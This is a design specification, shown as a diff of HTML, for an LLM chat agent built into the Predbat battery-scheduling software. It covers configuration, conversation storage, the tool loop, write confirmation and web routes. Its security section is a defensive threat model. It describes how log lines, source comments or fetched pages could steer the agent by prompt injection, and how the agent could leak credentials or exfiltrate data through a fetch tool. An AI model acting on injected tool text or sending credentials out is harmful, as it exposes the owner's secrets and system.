+<p>Two honest caveats, both documented: it costs money per request, and it is an OpenRouter
+feature — off OpenRouter the plugin is not sent at all, since it would be ignored at best by that
+endpoint. The component logs a one-time warning when the switch is on and the base URL is not
+OpenRouter, rather than letting the user wonder why nothing changed.</p>
+<h2 id="8-component-registration-and-gating">8. Component registration and gating</h2>
+<p>Added to <code>COMPONENT_LIST</code> in <code>apps/predbat/components.py</code>, phase 1, restartable:</p>
+<pre><code class="language-python">&quot;chat&quot;: {
+    &quot;class&quot;: ChatAgent,
+    &quot;name&quot;: &quot;AI Chat Agent&quot;,
+    &quot;can_restart&quot;: True,
+    &quot;phase&quot;: 1,
+    &quot;args&quot;: {
+        &quot;providers&quot;:         {&quot;required&quot;: False, &quot;config&quot;: &quot;chat&quot;},
+        &quot;api_key&quot;:           {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_api_key&quot;},
+        &quot;base_url&quot;:          {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_api_url&quot;},
+        &quot;api_type&quot;:          {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_api_type&quot;, &quot;default&quot;: &quot;auto&quot;},
+        &quot;model&quot;:             {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_model&quot;},
+        &quot;legacy_api_key&quot;:    {&quot;required&quot;: False, &quot;config&quot;: &quot;openrouter_api_key&quot;},
+        &quot;legacy_base_url&quot;:   {&quot;required&quot;: False, &quot;config&quot;: &quot;openrouter_base_url&quot;},
+        &quot;legacy_model&quot;:      {&quot;required&quot;: False, &quot;config&quot;: &quot;openrouter_default_model&quot;},
+        &quot;max_tokens&quot;:        {&quot;required&quot;: False, &quot;config&quot;: &quot;openrouter_max_tokens&quot;, &quot;default&quot;: 0},
+        &quot;max_tool_rounds&quot;:   {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_max_tool_rounds&quot;, &quot;default&quot;: 32},
+        &quot;max_history&quot;:       {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_max_history&quot;, &quot;default&quot;: 0},
+        &quot;max_conversations&quot;: {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_max_conversations&quot;, &quot;default&quot;: 20},
+        &quot;expiry_days&quot;:       {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_expiry_days&quot;, &quot;default&quot;: 30},
+        &quot;turn_timeout&quot;:      {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_turn_timeout&quot;, &quot;default&quot;: 1800},
+        &quot;request_timeout&quot;:   {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_request_timeout&quot;, &quot;default&quot;: 300},
+        &quot;fetch_allowlist&quot;:   {&quot;required&quot;: False, &quot;config&quot;: &quot;chat_fetch_allowlist&quot;, &quot;default&quot;: None},
+    },
+},
+</code></pre>
+<p><strong>Amended during implementation.</strong> The spec originally gated the component on <code>required: True</code>
+for the key and model, so an unconfigured install never constructed it. That was reversed: the
+component now takes no required arguments and always starts, because the Chat tab configures its
+own providers by writing <code>apps.yaml</code>, so the component has to be running before any provider
+exists or there is nothing to configure it from. With none configured the tab shows a setup page
+and no turn can be sent — <code>ChatAgent.provider_ready()</code> is what that keys off.</p>
+<p>The model also stopped being required: it is chosen in the UI and remembered, so an install with
+only a key gets a working tab rather than none.</p>
+<p><code>ChatAgent.run()</code> returns <code>True</code> on its first tick without any network I/O; it loads the
+conversation index from storage and nothing else. Credentials are validated lazily on the first
+turn. Validating at startup would let a slow or unreachable OpenRouter block Predbat's boot
+inside <code>wait_api_started()</code> for up to ten minutes.</p>
+<p><code>run()</code> thereafter, once a minute: flush dirty conversations, prune, and
+<code>update_success_timestamp()</code> so the Components tab shows the component as healthy.</p>
+<h2 id="9-configuration">9. Configuration</h2>
+<h3 id="91-appsyaml">9.1 <code>apps.yaml</code></h3>
+<p>The endpoint is described by a <code>chat:</code> block of named providers; <code>chat_*</code> keys describe
+behaviour. All added to <code>APPS_SCHEMA</code> in <code>apps/predbat/config.py</code>.</p>
+<p><strong>Amended during implementation.</strong> The spec originally had a single flat <code>openrouter_*</code>
+connection, on the assumption that OpenRouter was the endpoint. It is not: any OpenAI-compatible
+API works, including a local Ollama, which was verified against a real server rather than
+assumed. Since more than one can now be worth configuring at once - a hosted model and a local
+one - the connection became a block of named entries rather than one set of keys.</p>
+<pre><code class="language-yaml">pred_bat:
+  chat:
+    openrouter:
+      api_key: !secret openrouter_key
+    ollama:
+      url: 'http://localhost:11434/v1'
+    nas:
+      type: ollama
+      url: 'http://192.168.1.50:11434/v1'
+</code></pre>
+<p>The dict key is the user's own name for an endpoint, not the provider type, so two Ollama servers
+or two OpenRouter accounts are simply two entries. Each entry takes:</p>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Required</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>url</code></td>
+<td>For a local endpoint</td>
+<td>The OpenAI-compatible base URL. Defaults to the endpoint the resolved type normally lives at</td>
+</tr>
+<tr>
+<td><code>api_key</code></td>
+<td>For a hosted endpoint</td>
+<td>Omitted for a local endpoint, which needs none</td>
+</tr>
+<tr>
+<td><code>type</code></td>
+<td>No</td>
+<td><code>openrouter</code>, <code>ollama</code>, <code>openai</code> or <code>local</code>. Falls back to the entry's name when that is itself a provider, then to detection from the url</td>
+</tr>
+</tbody>
+</table>
+<p>A provider is <em>usable</em> only when a turn sent to it would not fail immediately: a hosted endpoint
+needs its key, a local one only needs to be pointed at. A half-configured entry is listed rather
+than dropped, so the Chat tab can show what is missing.</p>
+<table>
+<thead>
+<tr>
+<th>Key</th>
+<th>Type</th>
+<th>Required</th>
+<th>Default</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>chat</code></td>
+<td>dict</td>
+<td>No</td>
+<td>—</td>
+<td>Named provider block, above</td>
+</tr>
+<tr>
+<td><code>chat_api_key</code> / <code>chat_api_url</code> / <code>chat_api_type</code> / <code>chat_model</code></td>
+<td>string</td>
+<td>No</td>
+<td>—</td>
+<td>A single unnamed provider, read only when no <code>chat:</code> block exists</td>
+</tr>
+<tr>
+<td><code>openrouter_api_key</code> / <code>openrouter_base_url</code> / <code>openrouter_default_model</code></td>
+<td>string</td>
+<td>No</td>
+<td>—</td>
+<td>The pre-rename names, still read so an existing <code>apps.yaml</code> keeps working</td>
+</tr>
+<tr>
+<td><code>openrouter_max_tokens</code></td>
+<td>integer</td>
+<td>No</td>
+<td>0 (unset)</td>
+<td>Per-response completion cap; omitted from the request when 0</td>
+</tr>
+<tr>
+<td><code>chat_max_tool_rounds</code></td>
+<td>integer</td>
+<td>No</td>
+<td>32</td>
+<td>Model round trips in one turn. Renamed from <code>chat_max_tool_calls</code>, which is what it always bounded: every call inside one round already runs</td>
+</tr>
+<tr>
+<td><code>chat_max_history</code></td>
+<td>integer</td>
+<td>No</td>
+<td>0 (unlimited)</td>
+<td>Messages retained per conversation</td>
+</tr>
+<tr>
+<td><code>chat_max_conversations</code></td>
+<td>integer</td>
+<td>No</td>
+<td>20</td>
+<td>Visible conversations before the least recently used is hidden</td>
+</tr>
+<tr>
+<td><code>chat_expiry_days</code></td>
+<td>integer</td>
+<td>No</td>
+<td>30</td>
+<td>Days of inactivity before a conversation expires from the cache</td>
+</tr>
+<tr>
+<td><code>chat_turn_timeout</code></td>
+<td>integer</td>
+<td>No</td>
+<td>1800</td>
+<td>Wall-clock seconds for a whole turn, excluding time awaiting a confirmation</td>
+</tr>
+<tr>
+<td><code>chat_request_timeout</code></td>
+<td>integer</td>
+<td>No</td>
+<td>300</td>
+<td>Wall-clock seconds for one completion request</td>
+</tr>
+<tr>
+<td><code>chat_fetch_allowlist</code></td>
+<td>string_list</td>
+<td>No</td>
+<td>docs site, <code>github.com</code>, <code>raw.githubusercontent.com</code></td>
+<td>Hosts <code>fetch_url</code> may reach</td>
+</tr>
+</tbody>
+</table>
+<p><code>chat_turn_timeout</code> and <code>chat_request_timeout</code> were one value in the original spec. They bound
+different things and conflating them meant a turn died on its total budget after two or three
+completions even when no single request was slow.</p>
+<p>An <code>api_key</code> matches the existing <code>_key</code> suffix heuristic, so it is redacted by
+<code>mask_secret_args()</code> in the Apps view, the debug YAML and the <code>get_apps</code> tool. That function was
+made recursive during implementation: it walked only top-level keys, so a credential nested
+inside the <code>chat:</code> block - or inside <code>forecast_solar</code> - was returned to the model in the clear.</p>
+<p>The provider block is documented rather than hidden. It is the supported way to point
+Predbat at a local model, and an undocumented key that users discover from the source is worse
+than a documented one.</p>
+<h3 id="92-config_items">9.2 <code>CONFIG_ITEMS</code></h3>
+<p>Two new switches in <code>apps/predbat/config.py</code>:</p>
+<pre><code class="language-python">{&quot;name&quot;: &quot;chat_confirm_writes&quot;, &quot;friendly_name&quot;: &quot;Chat confirm before changing settings&quot;,
+ &quot;type&quot;: &quot;switch&quot;, &quot;default&quot;: True},
+{&quot;name&quot;: &quot;chat_web_search&quot;, &quot;friendly_name&quot;: &quot;Chat web search (costs per request)&quot;,
+ &quot;type&quot;: &quot;switch&quot;, &quot;default&quot;: False},
+</code></pre>
+<p>Both surface in Home Assistant and the Config tab. <code>chat_confirm_writes</code> is read at the moment a
+write tool is called, not cached at turn start, so toggling it takes effect immediately.</p>
+<h2 id="10-conversations">10. Conversations</h2>
+<h3 id="101-model">10.1 Model</h3>
+<p>Many saved conversations; <strong>one running turn at a time across the whole component</strong>. While a
+turn runs, every other conversation stays readable and switchable; only sending is locked, and
+the lock is global rather than per-conversation. This keeps the concurrency story to a single
+flag while still letting a user go and read something else during a slow turn.</p>
+<p>A conversation is:</p>
+<pre><code class="language-python">{
+    &quot;id&quot;: &quot;3f9a1c8e5b2d4a70&quot;,       # secrets.token_hex(8)
+    &quot;title&quot;: &quot;Why is it charging at 3am&quot;,
+    &quot;created&quot;: &quot;2026-08-27T09:14:02+01:00&quot;,
+    &quot;updated&quot;: &quot;2026-08-27T09:18:44+01:00&quot;,
+    &quot;deleted&quot;: False,
+    &quot;model&quot;: &quot;anthropic/claude-sonnet-4.5&quot;,   # None means &quot;use the apps.yaml default&quot;
+    &quot;usage_total&quot;: {&quot;prompt_tokens&quot;: 0, &quot;completion_tokens&quot;: 0, &quot;cost&quot;: 0.0},
+    &quot;messages&quot;: [...],              # OpenAI format: user, assistant (with tool_calls), tool
+}
+</code></pre>
+<p>Ids are <code>secrets.token_hex(8)</code> rather than slugified titles. Storage sanitises identifiers with
+<code>_safe_name()</code> (<code>apps/predbat/storage.py:55</code>), which maps any unsafe character to <code>_</code> — so two
+different human titles could collapse onto the same filename. Hex ids cannot.</p>
+<h3 id="102-server-state">10.2 Server state</h3>
+<p>Held by <code>ConversationStore</code> in <code>chat_store.py</code>, under a <code>threading.Lock</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>index</code></td>
+<td><code>id</code> → conversation metadata (everything but <code>messages</code>, plus <code>message_count</code>)</td>
+</tr>
+<tr>
+<td><code>bodies</code></td>
+<td><code>OrderedDict</code> <code>id</code> → <code>messages</code>, an LRU cache of at most 5 loaded conversations</td>
+</tr>
+<tr>
+<td><code>dirty</code></td>
+<td>Set of ids with unflushed changes</td>
+</tr>
+</tbody>
+</table>
+<p>Held by <code>ChatAgent</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Contents</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>events</code></td>
+<td>Append-only global event buffer, each stamped with <code>seq</code> and <code>conversation_id</code></td>
+</tr>
+<tr>
+<td><code>event_seq</code></td>
+<td>Next sequence number</td>
+</tr>
+<tr>
+<td><code>active</code></td>
+<td><code>{"conversation_id", "turn_id", "title"}</code> while a turn runs, else <code>None</code></td>
+</tr>
+<tr>
+<td><code>pending_confirm</code></td>
+<td><code>call_id</code> → <code>{"conversation_id", "approved": bool or None, "expires": datetime}</code></td>
+</tr>
+</tbody>
+</table>
+<p>There is deliberately <strong>no server-side "current conversation"</strong>. Which conversation a browser is
+looking at is client state, held in <code>localStorage</code> and passed on every request. Two browsers can
+therefore sit in different conversations without fighting over a shared cursor, and the only
+global server state is <code>active</code>.</p>
+<p>Bodies load lazily on first access and are evicted LRU beyond five, flushing first if dirty, so
+twenty saved conversations do not have to sit in memory.</p>
+<p>The system message is <strong>not</strong> stored — it is rebuilt from live data at the start of every turn
+(section 12), so a restored conversation is never anchored to a stale snapshot.</p>
+<h3 id="103-persistence-and-expiry">10.3 Persistence and expiry</h3>
+<p>Through the Storage component, as CLAUDE.md requires. One index plus one file per conversation,
+so a turn rewrites only the conversation it touched:</p>
+<ul>
+<li><code>chat/index</code> → <code>{"version": 1, "conversations": [metadata, ...]}</code></li>
+<li><code>chat/conv_&lt;id&gt;</code> → <code>{"version": 1, "id": ..., "messages": [...]}</code></li>
+</ul>
+<p>Both <code>format="json"</code>. Both are saved with <code>expiry = now_utc + chat_expiry_days</code>, and every save
+renews it — so the clock measures <strong>inactivity</strong>, and a conversation nobody has touched for 30
+days ages out of the cache on its own. <code>StorageComponent.load()</code> already returns <code>None</code> for an
+expired entry, so nothing has to sweep.</p>
+<p>Written at the end of each turn and on the housekeeping tick when dirty, never per token. A
+payload with an unrecognised <code>version</code> is discarded and logged rather than half-parsed.</p>
+<p>The index self-heals: on load, any entry whose body <code>load()</code> returns <code>None</code> — expired, or file
+gone — is dropped and the index rewritten.</p>
+<h3 id="104-deletion-is-a-flag-not-a-delete">10.4 Deletion is a flag, not a delete</h3>
+<p>Storage has no delete operation, and adding one to reach a single feature is not worth widening
+the abstraction. Deleting a conversation therefore sets <code>deleted: True</code> in its index entry. A
+deleted conversation is hidden from the list, refused by every route that takes an id, excluded
+from the <code>chat_max_conversations</code> count and never loaded or re-saved — so its file stops being
+renewed and expires on the normal <code>chat_expiry_days</code> clock.</p>
+<p>The consequence is worth stating plainly rather than hiding: <strong>a deleted conversation's file
+remains in the cache directory for up to <code>chat_expiry_days</code>.</strong> It is invisible in the UI but
+readable by anyone with filesystem access. <code>docs/components.md</code> will say so, next to the
+existing note that the web UI has no authentication.</p>
+<p>Deleting the conversation with the active turn is refused with 409. There is no undelete in the
+UI; the flag makes one easy to add later if anyone asks.</p>
+<h3 id="105-pruning">10.5 Pruning</h3>
+<p>Two independent limits:</p>
+<ul>
+<li><strong>Within a conversation</strong>, <code>chat_max_history</code> messages (section 10.6).</li>
+<li><strong>Across conversations</strong>, <code>chat_max_conversations</code>. When a new one is created, the least
+  recently <code>updated</code> conversations beyond the cap are marked <code>deleted</code> — the same flag, the same
+  expiry path — and a line is logged naming what went. The conversation with a running turn is
+  never pruned.</li>
+</ul>
+<h3 id="106-history-trimming-a-trap-worth-stating">10.6 History trimming — a trap worth stating</h3>
+<p>Trimming to "the last N messages" will eventually cut between an <code>assistant</code> message carrying
+<code>tool_calls</code> and the <code>tool</code> messages answering them. OpenAI-compatible APIs reject that with a
+400: every <code>tool_call_id</code> must have a matching <code>tool</code> message in the same request.</p>
+<p>Trimming therefore walks backwards to the nearest <strong><code>user</code> message boundary</strong> at or before the
+cut point, so a kept window always begins a complete exchange. If no such boundary exists
+within the window the whole conversation is kept and a warning is logged.</p>
+<h2 id="11-the-agentic-turn">11. The agentic turn</h2>
+<pre><code class="language-text">run_turn(conversation_id, text):
+    claim active = {conversation_id, turn_id}, else raise Busy
+    emit global &quot;busy&quot; event
+    load body; append user message; emit &quot;user&quot; event
+    for iteration in range(max_tool_calls + 1):
+        messages = [system_snapshot()] + trim(body.messages)
+        stream POST {base_url}/chat/completions
+              {model: conversation.model or default, messages,
+               tools: openai_tool_list() + openai_tool_list(CHAT_TOOL_DEFS),
+               stream: true, usage: {include: true},
+               [max_tokens], [plugins: [{&quot;id&quot;: &quot;web&quot;}] if chat_web_search]}
+        for each SSE chunk:
+            content delta      -&gt; emit &quot;delta&quot;
+            tool_call delta    -&gt; accumulate by index
+            annotations        -&gt; collect url_citations
+            usage              -&gt; emit &quot;usage&quot;, add to conversation usage_total
+        append assistant message; emit &quot;assistant&quot; (with sources, if any)
+        if no tool_calls: break
+        for each tool_call:
+            if def.writes and chat_confirm_writes:
+                emit &quot;confirm&quot;; await approval (section 13)
+                if not approved: result = {&quot;success&quot;: false, &quot;error&quot;: &quot;User declined&quot;}
+            else:
+                emit &quot;tool_start&quot;; result = await dispatch(name, args); emit &quot;tool_end&quot;
+            append tool message
+    else:
+        emit &quot;assistant&quot; with a visible &quot;tool call limit reached&quot; note
+    if still untitled: apply the first-user-message fallback; emit &quot;title&quot;
+    mark dirty; persist; emit &quot;done&quot;; clear active; emit global &quot;idle&quot;
+</code></pre>
+<p><code>dispatch()</code> tries <code>CHAT_TOOL_DEFS</code> handlers first, binding <code>conversation_id</code> for
+<code>set_chat_title</code>, then falls through to <code>PredbatTools.execute()</code>.</p>
+<p>Notes:</p>
+<ul>
+<li>Tool-call deltas arrive fragmented across chunks and are keyed by <code>index</code>, not by <code>id</code> — the
+  <code>id</code> and <code>name</code> appear only in the first fragment. The accumulator keys on <code>index</code>.</li>
+<li>Arguments arrive as a JSON string built up across chunks; malformed JSON at the end is
+  reported back to the model as a tool error rather than raised, so it can retry.</li>
+<li>The whole turn is wrapped in <code>asyncio.wait_for(..., turn_timeout)</code>. Time parked awaiting a
+  confirmation is excluded by pausing the deadline, otherwise a user who steps away turns their
+  own approval into a timeout.</li>
+<li><code>active</code> is claimed and released under the lock, and released in a <code>finally</code>, so a crashed
+  turn cannot wedge the tab. The <code>idle</code> event is emitted on every exit path.</li>
+</ul>
+<h2 id="12-system-prompt-and-the-live-snapshot">12. System prompt and the live snapshot</h2>
+<p>The system message is rebuilt each turn from three parts.</p>
+<p><strong>A static primer</strong> — a short paragraph on what Predbat is, that the user is the system owner,
+that answers should be concise and reference real values, that it should call a tool rather
+than guess, that <code>search_docs</code> is the way to answer configuration questions and
+<code>search_source</code> then <code>read_source</code> the way to answer "what does the code do", that the source it
+can read is the exact version running, and that it must never invent an entity name.</p>
+<p><strong>A live snapshot</strong>, roughly 400-800 tokens, assembled from <code>self.base</code>: current time and
+timezone, mode, <code>soc_kw</code>/<code>soc_max</code>/<code>soc_percent</code>, reserve, current import and export rate, the
+next charge window and next export window with times and limits, <code>status</code>, <code>had_errors</code>,
+inverter count and types, number of cars, the currency symbol, and the running Predbat version
+so the model knows which source it is looking at.</p>
+<p><strong>The title instruction</strong> (section 6), included only while the conversation is untitled.</p>
+<p>The snapshot answers the commonest questions with zero tool calls and stops weaker models
+answering from nothing. Everything deeper — the full plan, the log, <code>apps.yaml</code>, internal state
+— stays behind a tool call, which is what keeps the per-turn cost bounded.</p>
+<p>Snapshot assembly is a pure function of <code>base</code> state, isolated in <code>chat.py</code> as
+<code>build_snapshot(base)</code> so it can be tested against a stub without an LLM.</p>
+<h2 id="13-write-confirmation">13. Write confirmation</h2>
+<p>When <code>chat_confirm_writes</code> is on and the model calls a tool with <code>writes: True</code>:</p>
+<ol>
+<li>A <code>confirm</code> event is emitted carrying <code>call_id</code>, tool name and the decoded arguments.</li>
+<li>The browser renders a card: <em>"Set <code>input_number.predbat_best_soc_keep</code> to 2.0"</em> with
+   <strong>Approve</strong> and <strong>Reject</strong>.</li>
+<li>The turn parks, polling <code>pending_confirm[call_id]["approved"]</code> every 0.2 s for up to 300 s.</li>
+<li><code>POST /chat/confirm</code> sets <code>approved</code> under the lock.</li>
+<li>Approved → the tool executes normally. Rejected or timed out → the tool result becomes
+   <code>{"success": false, "error": "User declined this change"}</code>.</li>
+</ol>
+<p>Feeding a rejection back as an ordinary tool result, rather than aborting, lets the model
+acknowledge it and offer an alternative — which is the behaviour a user expects from a refusal.</p>
+<p>With the switch off, write tools execute directly and still emit <code>tool_start</code>/<code>tool_end</code>, so the
+transcript always records what was changed.</p>
+<p>A pending confirmation is dropped when its turn ends. <code>POST /chat/confirm</code> for an unknown or
+expired <code>call_id</code>, or one belonging to a different conversation than the caller claims, returns
+404 rather than silently succeeding.</p>
+<p>Because a user can navigate away from the running conversation, a confirmation can be waiting in
+a conversation nobody is looking at. The global <code>busy</code> banner therefore names the conversation
+and links to it, and the list entry for a conversation with a pending confirmation is badged.</p>
+<h2 id="14-security-and-privacy">14. Security and privacy</h2>
+<h3 id="141-credentials-must-not-reach-openrouter">14.1 Credentials must not reach OpenRouter</h3>
+<p>Chat output goes to a third party — OpenRouter, and through it whichever provider serves the
+chosen model. <code>get_apps</code> accepts a <code>masked</code> argument that defaults to true but <em>can be set
+false</em>, which over MCP is the user's own deliberate choice on their own machine. In chat it
+would let the model ask for unmasked credentials and ship them off-box.</p>
+<p>The chat projection therefore strips <code>masked</code> from <code>get_apps</code>' schema entirely
+(<code>chat_omit_properties</code>), so the model cannot express the request. <code>_execute_get_apps</code> keeps its
+existing default of <code>masked=True</code>, so the omitted property resolves to the safe value. A test
+asserts the property is absent from <code>openai_tool_list()</code> and present in <code>mcp_tool_list()</code>.</p>
+<p><code>get_state</code> already filters through <code>DEBUG_EXCLUDE_LIST</code>, and <code>get_config</code>/<code>get_entities</code>
+return Predbat's own settings, which hold no credentials.</p>
+<h3 id="142-exfiltration">14.2 Exfiltration</h3>
+<p><code>fetch_url</code> is the one tool that can send data outward to an address the model chooses. Section
+7.3 fences it with an allowlist, resolved-address checks and redirect re-validation. Those
+controls exist for this reason specifically, not as generic hygiene, and the allowlist must not
+be widened to a wildcard.</p>
+<h3 id="143-source-reading-stays-inside-the-source">14.3 Source reading stays inside the source</h3>
+<p><code>search_source</code> and <code>read_source</code> are restricted by an extension allowlist rather than by
+directory, because <code>config_root</code> and the source directory can be the same path — the repository
+even ships <code>apps/predbat/config/apps.yaml</code> — and the Storage cache lives under <code>config_root</code>
+(section 7.2.1). <code>apps.yaml</code>, <code>secrets.yaml</code>, <code>predbat.log</code> and the token cache are therefore
+unreachable through these tools on every install, leaving the masked <code>get_apps</code> and the filtered
+<code>get_log</code> as the only routes to that content. That is the point: those two redact, and a raw
+file read would not.</p>
+<h3 id="144-disclosure">14.4 Disclosure</h3>
+<p>The Chat tab shows a dismissible banner on first use naming the destination — OpenRouter and
+the selected model's provider — and stating that tool results, including log lines and
+configuration, are sent there. The dismissal is stored in <code>localStorage</code>.</p>
+<h3 id="145-network-exposure">14.5 Network exposure</h3>
+<p>The Predbat web UI has no authentication, so anyone who can reach port 5052 can use the chat,
+read every saved conversation, and spend the user's OpenRouter credit. This is the same exposure
+the existing MCP caution documents, and <code>docs/components.md</code> will carry the equivalent warning
+for chat. Saved conversations, and deleted ones lingering until expiry (section 10.4), make it
+slightly worse than a transient chat would be, which is worth saying plainly in the docs.</p>
+<h3 id="146-prompt-injection">14.6 Prompt injection</h3>
+<p>Tool results are data, and some of it — log lines, entity names, <code>apps.yaml</code> comments, source
+comments and fetched web pages — is text the model could be steered by. Two privileged actions are reachable:
+a Predbat write, which is behind the confirmation gate whose card shows the <em>actual</em> tool and
+arguments rather than the model's description of them; and an outbound fetch, which is behind
+the allowlist. The <code>chat_max_tool_rounds</code> cap bounds a runaway loop.</p>
+<h3 id="147-xss">14.7 XSS</h3>
+<p>Model output is rendered as markdown, and so are conversation titles, which are derived from
+model or user text. The renderer escapes HTML <strong>first</strong>, then applies a small fixed set of
+transforms (fenced code, inline code, bold, italic, links, bullet and numbered lists, line
+breaks). Fetched page text, returned source lines and <code>url_citation</code> URLs are escaped the same
+way. No <code>innerHTML</code> of
+unescaped text anywhere, and no external markdown library.</p>
+<h2 id="15-web-layer">15. Web layer</h2>
+<p>Registered from <code>WebInterface.start()</code> via <code>self._register_chat_routes(app)</code>, mirroring the
+existing <code>_register_annual_routes()</code> split so the routes can be asserted against a bare
+<code>aiohttp.Application</code> in a test without opening a socket. Routes are registered only when
+<code>components.get_component("chat")</code> is not None.</p>
+<table>
+<thead>
+<tr>
+<th>Method</th>
+<th>Path</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td><code>/chat</code></td>
+<td>The tab</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/chat/conversations</code></td>
+<td>List non-deleted: <code>{id, title, updated, message_count, cost, pending_confirm}</code> plus the current <code>active</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/conversations</code></td>
+<td>Create; returns the new <code>{id}</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/rename</code></td>
+<td><code>{id, title}</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/delete</code></td>
+<td><code>{id}</code>; sets the flag. <strong>409</strong> if that conversation has the active turn</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/chat/history?conversation=&lt;id&gt;</code></td>
+<td>Full transcript, <code>usage_total</code> and model, for first paint</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/send</code></td>
+<td><code>{conversation, message}</code> → <code>{turn_id}</code>; <strong>409</strong> if any turn is active</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/chat/stream?conversation=&lt;id&gt;&amp;cursor=N</code></td>
+<td>SSE from sequence <code>N</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/confirm</code></td>
+<td><code>{conversation, turn_id, call_id, approve}</code></td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/cancel</code></td>
+<td><code>{turn_id}</code>; aborts the active turn</td>
+</tr>
+<tr>
+<td>GET</td>
+<td><code>/chat/models</code></td>
+<td>Model catalogue for the picker</td>
+</tr>
+<tr>
+<td>POST</td>
+<td><code>/chat/model</code></td>
+<td><code>{conversation, id}</code>; <strong>409</strong> if that conversation is mid-turn</td>
+</tr>
+</tbody>
+</table>
+<p>An unknown or deleted <code>conversation</code> id returns 404 on every route that takes one.</p>
+<h3 id="151-sse-protocol">15.1 SSE protocol</h3>
+<p>Frames are <code>id: &lt;seq&gt;\nevent: &lt;type&gt;\ndata: &lt;json&gt;\n\n</code>. The handler loops: read events after
+the cursor under the lock, write those whose <code>conversation_id</code> is either the requested one or
+<code>None</code> (global), <code>await asyncio.sleep(0.1)</code>. A comment heartbeat every 15 s keeps proxies from
+closing an idle stream.</p>
+<table>
+<thead>
+<tr>
+<th>Event</th>
+<th>Scope</th>
+<th>Payload</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>user</code></td>
+<td>conversation</td>
+<td><code>{text}</code></td>
+</tr>
+<tr>
+<td><code>delta</code></td>
+<td>conversation</td>
+<td><code>{text}</code> — assistant token chunk</td>
+</tr>
+<tr>
+<td><code>assistant</code></td>
+<td>conversation</td>
+<td><code>{text, sources}</code> — the completed message</td>
+</tr>
+<tr>
+<td><code>tool_start</code></td>
+<td>conversation</td>
+<td><code>{call_id, name, arguments}</code></td>
+</tr>
+<tr>
+<td><code>tool_end</code></td>
+<td>conversation</td>
+<td><code>{call_id, name, ok, elapsed, preview}</code></td>
+</tr>
+<tr>
+<td><code>confirm</code></td>
+<td>conversation</td>
+<td><code>{call_id, name, arguments}</code></td>
+</tr>
+<tr>
+<td><code>confirm_result</code></td>
+<td>conversation</td>
+<td><code>{call_id, approved}</code></td>
+</tr>
+<tr>
+<td><code>usage</code></td>
+<td>conversation</td>
+<td><code>{prompt_tokens, completion_tokens, cost, conversation_cost}</code></td>
+</tr>
+<tr>
+<td><code>title</code></td>
+<td>conversation</td>
+<td><code>{title}</code> — from <code>set_chat_title</code> or the fallback</td>
+</tr>
+<tr>
+<td><code>error</code></td>
+<td>conversation</td>
+<td><code>{message}</code></td>
+</tr>
+<tr>
+<td><code>done</code></td>
+<td>conversation</td>
+<td><code>{turn_id}</code></td>
+</tr>
+<tr>
+<td><code>busy</code></td>
+<td>global</td>
+<td><code>{conversation_id, title, turn_id}</code> — lock the composer everywhere</td>
+</tr>
+<tr>
+<td><code>idle</code></td>
+<td>global</td>
+<td><code>{}</code> — unlock</td>
+</tr>
+<tr>
+<td><code>reload</code></td>
+<td>global</td>
+<td><code>{}</code> — the cursor predates the buffer; refetch</td>
+</tr>
+</tbody>
+</table>
+<p>Cursor replay rather than a live queue means two open browsers both follow the same turn, a
+reload mid-turn resumes from where it left off, and switching conversations is just a new cursor
+against the same buffer. The buffer is capped at 2000 events; a cursor older than the buffer's
+base gets <code>reload</code>.</p>
+<p>Global <code>busy</code>/<code>idle</code> events reach every browser regardless of which conversation it is viewing,
+which is what makes "browse freely, sending locked" work.</p>
+<h3 id="152-model-picker">15.2 Model picker</h3>
+<p><code>GET /chat/models</code> fetches <code>{base_url}/models</code>, keeps only entries whose
+<code>supported_parameters</code> contains <code>tools</code>, and returns <code>{id, name, prompt_price, completion_price}</code>
+sorted by id. Cached through <code>storage.fetch_cached("chat", "models", ..., fresh_minutes=1440)</code>,
+so the picker costs one request a day. If the fetch fails, the list degrades to the single
+<code>apps.yaml</code> model and the dropdown notes that the catalogue is unavailable.</p>
+<p><code>POST /chat/model</code> sets the model <strong>on that conversation</strong> and persists it, so a cheap model can
+be used for one thread and an expensive one for another. Switching mid-conversation is allowed
+between turns and appends a visible note to the transcript. A "Use default" entry clears the
+override back to <code>None</code>, meaning the <code>apps.yaml</code> value. That value is always offered even if it
+is missing from the catalogue, so a provider with no <code>/models</code> endpoint
+still works.</p>
+<h3 id="153-the-tab">15.3 The tab</h3>
+<p>A conversation list down the left: title, relative updated time, cost, a badge for a pending
+confirmation, and a <strong>New chat</strong> button; rename and delete on each row. The transcript to the
+right, with a growing textarea below it — Enter to send, Shift+Enter for a newline — and a
+footer showing the per-conversation model picker, turn tokens and cost, and conversation cost.</p>
+<p>Tool calls render <strong>collapsed</strong>: a single line, <em>"called <code>get_plan</code>"</em>, with a disclosure
+triangle revealing arguments and the JSON result. Confirmation cards render inline and expanded.
+Web-search sources render as a compact list under the message that used them.</p>
